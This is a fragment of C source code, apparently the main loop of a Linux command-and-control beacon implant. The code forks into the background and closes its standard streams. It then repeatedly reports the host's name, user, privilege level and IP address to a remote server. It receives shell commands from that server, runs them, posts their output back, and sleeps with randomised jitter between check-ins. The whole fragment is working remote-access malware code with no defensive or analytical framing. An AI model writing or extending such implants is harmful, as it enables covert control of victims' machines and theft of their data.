    ssize_t elen = readlink("/proc/self/exe", g_exe_path, sizeof(g_exe_path) - 1);
    if (elen > 0) g_exe_path[elen] = 0;

    g_uid = getuid();
    srand((unsigned)time(NULL) ^ (unsigned)getpid());

    load_uuid();
    get_sysinfo();

    /* Daemonize: fork into background */
    pid_t pid = fork();
    if (pid > 0) { printf("[+] Beacon started (PID %d)\n", pid); return 0; }
    /* Child continues as daemon */

    /* Close stdin/stdout/stderr */
    close(0); close(1); close(2);

    /* Main loop */
    while (1) {
        char *uuid_e = json_escape(g_uuid);
        char *host_e = json_escape(g_hostname);
        char *user_e = json_escape(g_username);

        /* Get local IP */
        char ip_str[64] = "0.0.0.0";
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock >= 0) {
            struct sockaddr_in dummy;
            dummy.sin_family = AF_INET;
            dummy.sin_port = htons(80);
            inet_pton(AF_INET, "8.8.8.8", &dummy.sin_addr);
            if (connect(sock, (struct sockaddr*)&dummy, sizeof(dummy)) == 0) {
                struct sockaddr_in local;
                socklen_t locallen = sizeof(local);
                if (getsockname(sock, (struct sockaddr*)&local, &locallen) == 0)
                    inet_ntop(AF_INET, &local.sin_addr, ip_str, sizeof(ip_str));
            }
            close(sock);
        }
        char *ip_e = json_escape(ip_str);

        char body[4096];
        snprintf(body, sizeof(body),
            "{\"uuid\":%s,\"hostname\":%s,\"os\":\"Linux\",\"username\":%s,\"privilege\":\"%s\",\"ip\":%s,\"pid\":%d}",
            uuid_e, host_e, user_e, is_admin() ? "admin" : "user", ip_e, getpid());

        free(uuid_e); free(host_e); free(user_e); free(ip_e);

        int sleep_sec = 30;
        int tasks_executed = 0;
        char *resp = http_post("beacon", body);

        if (resp) {
            /* Parse tasks */
            const char *ts = strstr(resp, "\"tasks\"");
            if (ts && (ts = strchr(ts, '['))) {
                while (*ts && *ts != ']') {
                    const char *os = strchr(ts, '{');
                    if (!os) break;
                    const char *oe = strchr(os, '}');
                    if (!oe) break;
                    size_t olen = oe - os + 1;
                    char *task = malloc(olen + 1);
                    strncpy(task, os, olen);
                    task[olen] = 0;
                    char *tid = extract_value(task, "\"id\"");
                    char *tcmd = extract_value(task, "\"command\"");
                    free(task);
                    if (tid && tcmd) {
                        char *output = exec_task(tcmd);
                        if (output) {
                            char *out_e = json_escape(output);
                            free(output);
                            if (out_e) {
                                char *uuid_e2 = json_escape(g_uuid);
                                if (uuid_e2) {
                                    size_t rb_sz = strlen(out_e) + strlen(tid) + strlen(uuid_e2) + 128;
                                    char *rb = malloc(rb_sz);
                                    if (rb) {
                                        snprintf(rb, rb_sz,
                                            "{\"task_id\":%s,\"beacon_uuid\":%s,\"output\":%s,\"status\":\"completed\"}",
                                            tid, uuid_e2, out_e);
                                        char *rr = http_post("result", rb);
                                        free(rr); free(rb);
                                    }
                                    free(uuid_e2);
                                }
                                free(out_e);
                            }
                        }
                    }
                    tasks_executed++;
                    free(tid); free(tcmd);
                    ts = oe + 1;
                }
            }
            /* Parse sleep */
            const char *sl = strstr(resp, "\"sleep\"");
            if (sl) {
                sleep_sec = extract_int(sl + 6);
                if (sleep_sec < 5) sleep_sec = 5;
                if (sleep_sec > 3600) sleep_sec = 3600;
            }
            free(resp);
        }

        if (tasks_executed > 0) {
            /* Burst mode: check back fast after executing tasks */
            sleep(2 + rand() % 2);
        } else {
            /* Sleep with jitter */
            int jitter = sleep_sec - (sleep_sec / 3) + (rand() % ((sleep_sec * 2) / 3 + 1));
            if (jitter < 5) jitter = 5;
            if (jitter > 3600) jitter = 3600;
            sleep(jitter);
        }
    }
}
